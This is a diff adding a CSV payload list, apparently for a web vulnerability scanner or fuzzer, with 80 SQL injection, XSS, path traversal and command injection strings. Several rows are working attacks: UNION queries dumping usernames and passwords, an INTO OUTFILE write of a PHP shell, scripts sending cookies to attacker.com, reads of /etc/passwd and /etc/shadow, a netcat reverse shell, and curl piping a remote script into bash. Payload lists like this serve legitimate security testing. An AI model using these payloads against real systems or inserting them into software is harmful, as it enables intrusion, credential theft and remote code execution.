@@ -1,0 +1,81 @@
+type,payload
+SQL_INJECTION,' UNION SELECT NULL--
+SQL_INJECTION,"' UNION SELECT NULL,NULL--"
+SQL_INJECTION,"' UNION SELECT NULL,NULL,NULL--"
+SQL_INJECTION,"' UNION SELECT username,password FROM users--"
+SQL_INJECTION,"1 UNION SELECT table_name,NULL FROM information_schema.tables--"
+SQL_INJECTION,"' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables--"
+SQL_INJECTION,"0 UNION SELECT schema_name,NULL FROM information_schema.schemata--"
+SQL_INJECTION,"' UNION ALL SELECT NULL,@@version--"
+SQL_INJECTION,"' UNION SELECT user(),database()--"
+SQL_INJECTION,"1' UNION SELECT 'a','b' INTO OUTFILE '/var/www/html/shell.php'--"
+SQL_INJECTION,' OR 1=1--
+SQL_INJECTION,' OR '1'='1
+SQL_INJECTION,admin'--
+SQL_INJECTION,' OR 1=1#
+SQL_INJECTION,1' AND 1=2--
+SQL_INJECTION,"' AND SUBSTRING(username,1,1)='a'--"
+SQL_INJECTION,' OR 'x'='x
+SQL_INJECTION,1 AND (SELECT COUNT(*) FROM users)>0--
+SQL_INJECTION,"' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--"
+SQL_INJECTION,"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--"
+XSS,<script>alert(1)</script>
+XSS,<img src=x onerror=alert('XSS')>
+XSS,"""><script>alert(document.cookie)</script>"
+XSS,<svg onload=alert(1)>
+XSS,javascript:alert(1)
+XSS,<body onload=alert('XSS')>
+XSS,<iframe src=javascript:alert(1)></iframe>
+XSS,"'><script>alert(String.fromCharCode(88,83,83))</script>"
+XSS,<script>document.write('<img src=http://attacker.com/?c='+document.cookie+'>')</script>
+XSS,<input autofocus onfocus=alert(1)>
+XSS,<details open ontoggle=alert(1)>
+XSS,<script>fetch('https://attacker.com/?c='+btoa(document.cookie))</script>
+XSS,<marquee onstart=alert(1)>
+XSS,#<script>alert(1)</script>
+XSS,?name=<img src=x onerror=alert(1)>
+XSS,javascript:void(document.write('<script>alert(1)<\/script>'))
+XSS,"data:text/html,<script>alert(document.domain)</script>"
+XSS,<ScRiPt>alert(1)</sCrIpT>
+XSS,<%00script>alert(1)</%00script>
+XSS,"<img src=1 href=1 onerror=""javascript:alert(1)"">"
+PATH_TRAVERSAL,../../etc/passwd
+PATH_TRAVERSAL,../../../etc/shadow
+PATH_TRAVERSAL,../../../../etc/hosts
+PATH_TRAVERSAL,../../../../../etc/mysql/my.cnf
+PATH_TRAVERSAL,../../../../../../var/log/apache2/access.log
+PATH_TRAVERSAL,..%2F..%2Fetc%2Fpasswd
+PATH_TRAVERSAL,%2e%2e%2f%2e%2e%2fetc%2fpasswd
+PATH_TRAVERSAL,%252e%252e%252fetc%252fpasswd
+PATH_TRAVERSAL,..%2F..%2F..%2Fetc%2Fshadow
+PATH_TRAVERSAL,..%252f..%252fetc%252fpasswd
+PATH_TRAVERSAL,%2e%2e/%2e%2e/etc/passwd
+PATH_TRAVERSAL,....//....//etc/passwd
+PATH_TRAVERSAL,....\/....\/etc/passwd
+PATH_TRAVERSAL,..\..\windows\system32\drivers\etc\hosts
+PATH_TRAVERSAL,..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts
+PATH_TRAVERSAL,..%5C..%5Cboot.ini
+PATH_TRAVERSAL,../../windows/win.ini
+PATH_TRAVERSAL,../../etc/passwd%00
+PATH_TRAVERSAL,../../etc/passwd%00.jpg
+PATH_TRAVERSAL,/etc/passwd
+CMD_INJECTION,; ls -la
+CMD_INJECTION,| ls -la
+CMD_INJECTION,&& ls -la
+CMD_INJECTION,|| ls -la
+CMD_INJECTION,` ls -la `
+CMD_INJECTION,; cat /etc/passwd
+CMD_INJECTION,| cat /etc/passwd
+CMD_INJECTION,; whoami
+CMD_INJECTION,| whoami
+CMD_INJECTION,&& whoami
+CMD_INJECTION,& dir
+CMD_INJECTION,| dir
+CMD_INJECTION,&& dir
+CMD_INJECTION,; ping -c 4 attacker.com
+CMD_INJECTION,| ping -n 4 attacker.com
+CMD_INJECTION,$(cat /etc/passwd)
+CMD_INJECTION,${IFS}cat${IFS}/etc/passwd
+CMD_INJECTION,";{cat,/etc/passwd}"
+CMD_INJECTION,| nc attacker.com 4444 -e /bin/sh
+CMD_INJECTION,; curl http://attacker.com/shell.sh | bash
